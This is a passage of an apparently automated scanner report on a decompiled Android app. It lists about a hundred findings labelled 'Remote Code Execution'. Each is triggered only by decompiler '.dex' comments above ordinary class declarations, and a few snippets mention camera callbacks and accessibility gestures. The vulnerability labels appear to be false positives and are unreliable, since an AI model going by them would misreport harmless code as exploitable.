    /* loaded from: classes23.dex */
    public class a implements Comparator<Comparable> {
        @Override // java.util.Comparator
        public final int compare(Comparable comparable, Comparable comparable2) {
```

**390. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/k2/p.java`
- **Line:** 49

```java
        }
    }

    /* loaded from: classes11.dex */
    public class b extends AbstractSet<Map.Entry<K, V>> {

        /* loaded from: classes22.dex */
```

**391. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/k2/p.java`
- **Line:** 52

```java
    /* loaded from: classes11.dex */
    public class b extends AbstractSet<Map.Entry<K, V>> {

        /* loaded from: classes22.dex */
        public class a extends p<K, V>.d<Map.Entry<K, V>> {
            public a(b bVar) {
                super();
```

**392. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/k2/p.java`
- **Line:** 98

```java
        }
    }

    /* loaded from: classes16.dex */
    public final class c extends AbstractSet<K> {

        /* loaded from: classes20.dex */
```

**393. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/k2/e.java`
- **Line:** 6

```java
import java.lang.reflect.Type;
import java.util.Map;

/* loaded from: classes7.dex */
public final class e {

    /* renamed from: a, reason: collision with root package name */
```

**394. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/k2/e.java`
- **Line:** 36

```java
    }

    /* JADX INFO: Add missing generic type declarations: [T] */
    /* loaded from: classes12.dex */
    public class b<T> implements q<T> {

        /* renamed from: e, reason: collision with root package name */
```

**395. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/k2/i.java`
- **Line:** 7

```java
import java.lang.reflect.Type;
import java.util.EnumSet;

/* loaded from: classes8.dex */
public final class i implements q<Object> {

    /* renamed from: e, reason: collision with root package name */
```

**396. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/k2/j.java`
- **Line:** 5

```java

import java.util.LinkedHashSet;

/* loaded from: classes17.dex */
public final class j implements q<Object> {
    @Override // k2.q
    public final Object c() {
```

**397. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/k2/s.java`
- **Line:** 5

```java

import java.lang.reflect.Method;

/* loaded from: classes4.dex */
public final class s extends d1.f {

    /* renamed from: b, reason: collision with root package name */
```

**398. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/k2/f.java`
- **Line:** 3

```java
package k2;

/* loaded from: classes18.dex */
public final class f implements q<Object> {

    /* renamed from: e, reason: collision with root package name */
```

**399. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/k2/g.java`
- **Line:** 6

```java
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;

/* loaded from: classes24.dex */
public final class g implements q<Object> {

    /* renamed from: e, reason: collision with root package name */
```

**400. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/k2/r.java`
- **Line:** 5

```java

import java.lang.reflect.Method;

/* loaded from: classes25.dex */
public final class r extends d1.f {

    /* renamed from: b, reason: collision with root package name */
```

**401. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/k2/k.java`
- **Line:** 5

```java

import java.util.ArrayDeque;

/* loaded from: classes18.dex */
public final class k implements q<Object> {
    @Override // k2.q
    public final Object c() {
```

**402. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/k2/u.java`
- **Line:** 3

```java
package k2;

/* loaded from: classes23.dex */
public final class u extends d1.f {
    @Override // d1.f
    public final <T> T C(Class<T> cls) {
```

**403. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/k2/l.java`
- **Line:** 5

```java

import java.util.ArrayList;

/* loaded from: classes23.dex */
public final class l implements q<Object> {
    @Override // k2.q
    public final Object c() {
```

**404. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/k2/m.java`
- **Line:** 9

```java
import java.util.Iterator;
import java.util.List;

/* loaded from: classes8.dex */
public final class m implements a0, Cloneable {

    /* renamed from: d, reason: collision with root package name */
```

**405. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/k2/m.java`
- **Line:** 22

```java
    public List<i2.a> f3825c = Collections.emptyList();

    /* JADX INFO: Add missing generic type declarations: [T] */
    /* loaded from: classes11.dex */
    public class a<T> extends z<T> {

        /* renamed from: a, reason: collision with root package name */
```

**406. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/k2/a.java`
- **Line:** 15

```java
import java.util.HashMap;
import java.util.Objects;

/* loaded from: classes3.dex */
public final class a {

    /* renamed from: a, reason: collision with root package name */
```

**407. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/k2/a.java`
- **Line:** 22

```java
    public static final Type[] f3803a = new Type[0];

    /* renamed from: k2.a$a, reason: collision with other inner class name */
    /* loaded from: classes16.dex */
    public static final class C0042a implements GenericArrayType, Serializable {

        /* renamed from: b, reason: collision with root package name */
```

**408. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/k2/a.java`
- **Line:** 50

```java
        }
    }

    /* loaded from: classes6.dex */
    public static final class b implements ParameterizedType, Serializable {

        /* renamed from: b, reason: collision with root package name */
```

**409. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/k2/a.java`
- **Line:** 128

```java
        }
    }

    /* loaded from: classes24.dex */
    public static final class c implements WildcardType, Serializable {

        /* renamed from: b, reason: collision with root package name */
```

**410. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/k2/t.java`
- **Line:** 5

```java

import java.lang.reflect.Method;

/* loaded from: classes2.dex */
public final class t extends d1.f {

    /* renamed from: b, reason: collision with root package name */
```

**411. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/g0/b.java`
- **Line:** 7

```java
import java.util.ArrayList;
import java.util.List;

/* loaded from: classes19.dex */
public final class b {

    /* renamed from: a, reason: collision with root package name */
```

**412. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/g0/c.java`
- **Line:** 11

```java
import r.k;
import r.u;

/* loaded from: classes19.dex */
public final class c {

    /* renamed from: c, reason: collision with root package name */
```

**413. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/g0/d.java`
- **Line:** 8

```java
import java.util.concurrent.atomic.AtomicReference;
import l0.i;

/* loaded from: classes6.dex */
public final class d {

    /* renamed from: a, reason: collision with root package name */
```

**414. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/g0/e.java`
- **Line:** 11

```java
import java.util.Map;
import p.j;

/* loaded from: classes23.dex */
public final class e {

    /* renamed from: a, reason: collision with root package name */
```

**415. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/g0/e.java`
- **Line:** 20

```java
    /* renamed from: b, reason: collision with root package name */
    public final Map<String, List<a<?, ?>>> f2918b = new HashMap();

    /* loaded from: classes14.dex */
    public static class a<T, R> {

        /* renamed from: a, reason: collision with root package name */
```

**416. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/g0/f.java`
- **Line:** 9

```java
import java.util.List;
import p.k;

/* loaded from: classes9.dex */
public final class f {

    /* renamed from: a, reason: collision with root package name */
```

**417. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/g0/f.java`
- **Line:** 15

```java
    /* renamed from: a, reason: collision with root package name */
    public final List<a<?>> f2922a = new ArrayList();

    /* loaded from: classes6.dex */
    public static final class a<T> {

        /* renamed from: a, reason: collision with root package name */
```

**418. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/g0/a.java`
- **Line:** 7

```java
import java.util.ArrayList;
import java.util.List;

/* loaded from: classes18.dex */
public final class a {

    /* renamed from: a, reason: collision with root package name */
```

**419. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/g0/a.java`
- **Line:** 14

```java
    public final List<C0034a<?>> f2908a = new ArrayList();

    /* renamed from: g0.a$a, reason: collision with other inner class name */
    /* loaded from: classes22.dex */
    public static final class C0034a<T> {

        /* renamed from: a, reason: collision with root package name */
```

**420. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/h4/b.java`
- **Line:** 12

```java
import org.apache.commons.io.filefilter.NotFileFilter;
import org.apache.commons.io.filefilter.OrFileFilter;

/* loaded from: classes7.dex */
public final /* synthetic */ class b {
    public static FileVisitResult a(IOFileFilter iOFileFilter, Path path, BasicFileAttributes basicFileAttributes) {
        return AbstractFileFilter.toFileVisitResult(iOFileFilter.accept(path.toFile()), path);
```

**421. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/h3/a.java`
- **Line:** 7

```java
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

/* loaded from: classes12.dex */
public final class a {
    @NonNull
    public static byte[] a(String str) {
```

**422. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/j1/a.java`
- **Line:** 25

```java
import z1.b;

@RestrictTo({RestrictTo.Scope.LIBRARY_GROUP})
/* loaded from: classes4.dex */
public final class a {

    /* renamed from: t, reason: collision with root package name */
```

**423. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/e2/b.java`
- **Line:** 6

```java
import android.animation.Animator;
import android.animation.AnimatorListenerAdapter;

/* loaded from: classes3.dex */
public final class b extends AnimatorListenerAdapter {

    /* renamed from: a, reason: collision with root package name */
```

**424. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/e2/n.java`
- **Line:** 7

```java
import androidx.annotation.NonNull;
import com.google.android.material.textfield.TextInputLayout;

/* loaded from: classes2.dex */
public final class n extends i {
    public n(@NonNull TextInputLayout textInputLayout) {
        super(textInputLayout, 0);
```

**425. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/e2/o.java`
- **Line:** 27

```java
import v1.r;

@SuppressLint({"ViewConstructor"})
/* loaded from: classes2.dex */
public final class o extends LinearLayout {

    /* renamed from: b, reason: collision with root package name */
```

**426. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/e2/c.java`
- **Line:** 6

```java
import android.animation.ValueAnimator;
import androidx.annotation.NonNull;

/* loaded from: classes17.dex */
public final class c implements ValueAnimator.AnimatorUpdateListener {

    /* renamed from: a, reason: collision with root package name */
```

**427. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/e2/h.java`
- **Line:** 8

```java
import android.widget.AutoCompleteTextView;
import androidx.annotation.NonNull;

/* loaded from: classes15.dex */
public final class h implements View.OnTouchListener {

    /* renamed from: b, reason: collision with root package name */
```

**428. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/e2/d.java`
- **Line:** 7

```java
import androidx.annotation.NonNull;
import com.google.android.material.textfield.TextInputLayout;

/* loaded from: classes14.dex */
public final class d extends i {
    public d(@NonNull TextInputLayout textInputLayout, @DrawableRes int i5) {
        super(textInputLayout, i5);
```

**429. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/e2/e.java`
- **Line:** 13

```java
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

/* loaded from: classes12.dex */
public final class e extends b2.g {

    /* renamed from: z, reason: collision with root package name */
```

**430. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/e2/i.java`
- **Line:** 9

```java
import com.google.android.material.internal.CheckableImageButton;
import com.google.android.material.textfield.TextInputLayout;

/* loaded from: classes8.dex */
public abstract class i {

    /* renamed from: a, reason: collision with root package name */
```

**431. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/e2/j.java`
- **Line:** 15

```java
import com.google.android.material.textfield.TextInputLayout;
import java.util.Arrays;

/* loaded from: classes5.dex */
public final class j {
    public static void a(@NonNull TextInputLayout textInputLayout, @NonNull CheckableImageButton checkableImageButton, ColorStateList colorStateList, PorterDuff.Mode mode) {
        Drawable drawable = checkableImageButton.getDrawable();
```

**432. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/e2/f.java`
- **Line:** 5

```java

import android.widget.AutoCompleteTextView;

/* loaded from: classes21.dex */
public final class f implements AutoCompleteTextView.OnDismissListener {

    /* renamed from: a, reason: collision with root package name */
```

**433. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/e2/g.java`
- **Line:** 6

```java
import android.animation.Animator;
import android.animation.AnimatorListenerAdapter;

/* loaded from: classes22.dex */
public final class g extends AnimatorListenerAdapter {

    /* renamed from: a, reason: collision with root package name */
```

**434. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/e2/k.java`
- **Line:** 28

```java
import java.util.ArrayList;
import java.util.List;

/* loaded from: classes4.dex */
public final class k {

    /* renamed from: a, reason: collision with root package name */
```

**435. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/e2/k.java`
- **Line:** 102

```java
    /* renamed from: u, reason: collision with root package name */
    public Typeface f2569u;

    /* loaded from: classes3.dex */
    public class a extends AnimatorListenerAdapter {

        /* renamed from: a, reason: collision with root package name */
```

**436. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/e2/l.java`
- **Line:** 7

```java
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.EditText;

/* loaded from: classes14.dex */
public final class l extends View.AccessibilityDelegate {

    /* renamed from: a, reason: collision with root package name */
```

**437. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/e2/m.java`
- **Line:** 27

```java
import comeliest.metempsychosis.pokelogan.R;
import java.util.Locale;

/* loaded from: classes14.dex */
public final class m extends AppCompatAutoCompleteTextView {

    /* renamed from: b, reason: collision with root package name */
```

**438. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/e2/m.java`
- **Line:** 46

```java
    @LayoutRes
    public final int f2579e;

    /* loaded from: classes10.dex */
    public class a implements AdapterView.OnItemClickListener {
        public a() {
        }
```

**439. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/e2/a.java`
- **Line:** 6

```java
import android.animation.Animator;
import android.animation.AnimatorListenerAdapter;

/* loaded from: classes23.dex */
public final class a extends AnimatorListenerAdapter {

    /* renamed from: a, reason: collision with root package name */
```

**440. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f4/b.java`
- **Line:** 7

```java
import kotlin.jvm.internal.Intrinsics;

@JvmName(name = "-Util")
/* loaded from: classes6.dex */
public final class b {
    public static final boolean a(byte[] a5, int i5, byte[] b5, int i6, int i7) {
        Intrinsics.checkNotNullParameter(a5, "a");
```

**441. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f4/a0.java`
- **Line:** 5

```java

import java.io.Closeable;

/* loaded from: classes9.dex */
public interface a0 extends Closeable {
    @Override // java.io.Closeable, java.lang.AutoCloseable
    void close();
```

**442. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f4/w.java`
- **Line:** 7

```java
import kotlin.jvm.JvmStatic;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes13.dex */
public final class w {

    /* renamed from: b, reason: collision with root package name */
```

**443. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f4/n.java`
- **Line:** 10

```java
import java.util.zip.Inflater;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes25.dex */
public final class n implements a0 {

    /* renamed from: b, reason: collision with root package name */
```

**444. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f4/z.java`
- **Line:** 10

```java
import java.util.logging.Logger;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes24.dex */
public final class z extends c {

    /* renamed from: l, reason: collision with root package name */
```

**445. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f4/o.java`
- **Line:** 9

```java
import java.util.zip.Inflater;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes24.dex */
public final class o implements a0 {

    /* renamed from: b, reason: collision with root package name */
```

**446. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f4/v.java`
- **Line:** 8

```java
import kotlin.jvm.JvmField;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes19.dex */
public final class v {

    /* renamed from: a, reason: collision with root package name */
```

**447. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f4/c.java`
- **Line:** 9

```java
import kotlin.Unit;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes9.dex */
public class c extends b0 {

    /* renamed from: h, reason: collision with root package name */
```

**448. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f4/c.java`
- **Line:** 33

```java
    /* renamed from: g, reason: collision with root package name */
    public long f2846g;

    /* loaded from: classes8.dex */
    public static final class a {
        public final c a() {
            c cVar = c.f2842j;
```

**449. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f4/h.java`
- **Line:** 6

```java
import java.nio.channels.ReadableByteChannel;
import java.nio.charset.Charset;

/* loaded from: classes18.dex */
public interface h extends a0, ReadableByteChannel {
    boolean B();

```

**450. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f4/b0.java`
- **Line:** 8

```java
import kotlin.jvm.JvmField;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes2.dex */
public class b0 {

    /* renamed from: d, reason: collision with root package name */
```

**451. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f4/b0.java`
- **Line:** 24

```java
    /* renamed from: c, reason: collision with root package name */
    public long f2839c;

    /* loaded from: classes16.dex */
    public static final class a extends b0 {
        @Override // f4.b0
        public final b0 d(long j5) {
```

**452. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f4/d.java`
- **Line:** 7

```java
import kotlin.Unit;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes25.dex */
public final class d implements y {

    /* renamed from: b, reason: collision with root package name */
```

**453. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f4/q.java`
- **Line:** 5

```java

import java.util.logging.Logger;

/* loaded from: classes4.dex */
public final /* synthetic */ class q {

    /* renamed from: a, reason: collision with root package name */
```

**454. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f4/p.java`
- **Line:** 7

```java
import java.io.InputStream;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes21.dex */
public final class p implements a0 {

    /* renamed from: b, reason: collision with root package name */
```

**455. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f4/e.java`
- **Line:** 7

```java
import kotlin.Unit;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes9.dex */
public final class e implements a0 {

    /* renamed from: b, reason: collision with root package name */
```

**456. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f4/i.java`
- **Line:** 12

```java
import kotlin.jvm.internal.Intrinsics;
import kotlin.text.Charsets;

/* loaded from: classes12.dex */
public class i implements Serializable, Comparable<i> {

    /* renamed from: b, reason: collision with root package name */
```

**457. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f4/i.java`
- **Line:** 31

```java
    @JvmField
    public static final i f2860e = new i(new byte[0]);

    /* loaded from: classes19.dex */
    public static final class a {
        public static i c(byte[] toByteString) {
            a aVar = i.f2861f;
```

**458. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f4/j.java`
- **Line:** 7

```java
import kotlin.jvm.internal.Intrinsics;
import org.codehaus.mojo.animal_sniffer.IgnoreJRERequirement;

/* loaded from: classes19.dex */
public final class j implements y {

    /* renamed from: b, reason: collision with root package name */
```

**459. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f4/s.java`
- **Line:** 6

```java
import java.io.OutputStream;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes21.dex */
public final class s implements y {

    /* renamed from: b, reason: collision with root package name */
```

**460. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f4/f.java`
- **Line:** 22

```java
import kotlin.text.Charsets;
import kotlin.text.Typography;

/* loaded from: classes8.dex */
public final class f implements h, g, Cloneable, ByteChannel {

    /* renamed from: b, reason: collision with root package name */
```

**461. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f4/f.java`
- **Line:** 32

```java
    /* renamed from: c, reason: collision with root package name */
    public long f2852c;

    /* loaded from: classes21.dex */
    public static final class a implements Closeable {

        /* renamed from: b, reason: collision with root package name */
```

**462. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f4/g.java`
- **Line:** 5

```java

import java.nio.channels.WritableByteChannel;

/* loaded from: classes23.dex */
public interface g extends y, WritableByteChannel {
    g C(int i5);

```

**463. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f4/r.java`
- **Line:** 7

```java
import java.util.RandomAccess;
import kotlin.collections.AbstractList;

/* loaded from: classes20.dex */
public final class r extends AbstractList<i> implements RandomAccess {

    /* renamed from: d, reason: collision with root package name */
```

**464. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f4/r.java`
- **Line:** 19

```java
    /* renamed from: c, reason: collision with root package name */
    public final int[] f2885c;

    /* loaded from: classes13.dex */
    public static final class a {
        public final void a(long j5, f fVar, int i5, List<? extends i> list, int i6, int i7, List<Integer> list2) {
            int i8;
```

**465. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f4/k.java`
- **Line:** 5

```java

import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes15.dex */
public abstract class k implements y {

    /* renamed from: b, reason: collision with root package name */
```

**466. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f4/u.java`
- **Line:** 11

```java
import kotlin.jvm.internal.Intrinsics;
import kotlin.text.CharsKt;

/* loaded from: classes15.dex */
public final class u implements h {

    /* renamed from: b, reason: collision with root package name */
```

**467. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f4/y.java`
- **Line:** 6

```java
import java.io.Closeable;
import java.io.Flushable;

/* loaded from: classes10.dex */
public interface y extends Closeable, Flushable {
    void T(f fVar, long j5);

```

**468. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f4/l.java`
- **Line:** 5

```java

import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes19.dex */
public abstract class l implements a0 {

    /* renamed from: b, reason: collision with root package name */
```

**469. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f4/m.java`
- **Line:** 6

```java
import java.util.concurrent.TimeUnit;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes6.dex */
public final class m extends b0 {

    /* renamed from: e, reason: collision with root package name */
```

**470. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f4/x.java`
- **Line:** 7

```java
import kotlin.collections.ArraysKt;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes17.dex */
public final class x extends i {

    /* renamed from: g, reason: collision with root package name */
```

**471. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f4/a.java`
- **Line:** 7

```java
import kotlin.jvm.JvmName;

@JvmName(name = "-Base64")
/* loaded from: classes4.dex */
public final class a {

    /* renamed from: a, reason: collision with root package name */
```

**472. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f4/t.java`
- **Line:** 7

```java
import kotlin.jvm.JvmField;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes16.dex */
public final class t implements g {

    /* renamed from: b, reason: collision with root package name */
```

**473. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/i0/b.java`
- **Line:** 6

```java
import android.graphics.Bitmap;
import android.widget.ImageView;

/* loaded from: classes6.dex */
public final class b extends e<Bitmap> {
    public b(ImageView imageView) {
        super(imageView);
```

**474. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/i0/c.java`
- **Line:** 8

```java
import androidx.annotation.Nullable;
import l0.k;

/* loaded from: classes6.dex */
public abstract class c<T> implements h<T> {

    /* renamed from: b, reason: collision with root package name */
```

**475. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/i0/h.java`
- **Line:** 8

```java
import androidx.annotation.Nullable;
import e0.l;

/* loaded from: classes19.dex */
public interface h<R> extends l {
    void a(@NonNull g gVar);

```

**476. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/i0/d.java`
- **Line:** 7

```java
import android.widget.ImageView;
import androidx.annotation.Nullable;

/* loaded from: classes13.dex */
public final class d extends e<Drawable> {
    public d(ImageView imageView) {
        super(imageView);
```

**477. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/i0/e.java`
- **Line:** 9

```java
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

/* loaded from: classes11.dex */
public abstract class e<Z> extends i<ImageView, Z> {

    /* renamed from: d, reason: collision with root package name */
```

**478. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/i0/i.java`
- **Line:** 23

```java
import java.util.Objects;

@Deprecated
/* loaded from: classes18.dex */
public abstract class i<T extends View, Z> extends i0.a<Z> {

    /* renamed from: b, reason: collision with root package name */
```

**479. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/i0/i.java`
- **Line:** 33

```java
    public final a f3251c;

    @VisibleForTesting
    /* loaded from: classes10.dex */
    public static final class a {

        /* renamed from: d, reason: collision with root package name */
```

**480. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/i0/i.java`
- **Line:** 52

```java
        public ViewTreeObserverOnPreDrawListenerC0036a f3255c;

        /* renamed from: i0.i$a$a, reason: collision with other inner class name */
        /* loaded from: classes25.dex */
        public static final class ViewTreeObserverOnPreDrawListenerC0036a implements ViewTreeObserver.OnPreDrawListener {

            /* renamed from: b, reason: collision with root package name */
```

**481. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/i0/f.java`
- **Line:** 10

```java
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

/* loaded from: classes16.dex */
public final class f<Z> extends c<Z> {

    /* renamed from: f, reason: collision with root package name */
```

**482. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/i0/f.java`
- **Line:** 19

```java
    /* renamed from: e, reason: collision with root package name */
    public final com.bumptech.glide.i f3249e;

    /* loaded from: classes4.dex */
    public class a implements Handler.Callback {
        @Override // android.os.Handler.Callback
        public final boolean handleMessage(Message message) {
```

**483. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/i0/g.java`
- **Line:** 3

```java
package i0;

/* loaded from: classes22.dex */
public interface g {
    void b(int i5, int i6);
}
```

**484. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/i0/a.java`
- **Line:** 4

```java
package i0;

@Deprecated
/* loaded from: classes14.dex */
public abstract class a<Z> implements h<Z> {
    @Override // e0.l
    public final void onDestroy() {
```

**485. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f3/b.java`
- **Line:** 7

```java
import android.view.View;
import com.superbock.auto.BaseService;

/* loaded from: classes24.dex */
public final class b implements View.OnTouchListener {
    @Override // android.view.View.OnTouchListener
    public final boolean onTouch(View view, MotionEvent motionEvent) {
```

**486. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f3/n.java`
- **Line:** 3

```java
package f3;

/* loaded from: classes25.dex */
public final class n {

    /* renamed from: a, reason: collision with root package name */
```

**487. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f3/c.java`
- **Line:** 7

```java
import android.view.View;
import com.superbock.auto.BaseService;

/* loaded from: classes9.dex */
public final class c implements View.OnTouchListener {

    /* renamed from: b, reason: collision with root package name */
```

**488. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f3/h.java`
- **Line:** 5

```java

import f3.i;

/* loaded from: classes4.dex */
public final class h implements Runnable {

    /* renamed from: b, reason: collision with root package name */
```

**489. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f3/d.java`
- **Line:** 8

```java
import android.hardware.Camera;
import java.io.ByteArrayOutputStream;

/* loaded from: classes6.dex */
public final class d implements Camera.PictureCallback {

    /* renamed from: a, reason: collision with root package name */
```

**490. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f3/e.java`
- **Line:** 10

```java
import com.superbock.auto.BaseService;
import java.io.ByteArrayOutputStream;

/* loaded from: classes5.dex */
public final class e implements SurfaceHolder.Callback {

    /* renamed from: a, reason: collision with root package name */
```

**491. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f3/e.java`
- **Line:** 16

```java
    /* renamed from: a, reason: collision with root package name */
    public Camera f2791a;

    /* loaded from: classes19.dex */
    public class a implements Camera.PreviewCallback {
        @Override // android.hardware.Camera.PreviewCallback
        public final void onPreviewFrame(byte[] bArr, Camera camera) {
```

**492. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f3/i.java`
- **Line:** 108

```java
import s3.x;
import s3.y;

/* loaded from: classes9.dex */
public final class i {

    /* renamed from: a, reason: collision with root package name */
```

**493. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f3/i.java`
- **Line:** 141

```java
    /* renamed from: j, reason: collision with root package name */
    public static long f2804j;

    /* loaded from: classes14.dex */
    public class a extends d1.f {

        /* renamed from: b, reason: collision with root package name */
```

**494. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/f3/i.java`
- **Line:** 196

```java
        public final /* synthetic */ int f2821r;

        /* renamed from: f3.i$a$a, reason: collision with other inner class name */
        /* loaded from: classes20.dex */
        public class C0033a extends AccessibilityService.GestureResultCallback {

            /* renamed from: a, reason: collision with root package name */
```

**495. Remote Code Execution**
- **Description:** Pattern detected: .DEX
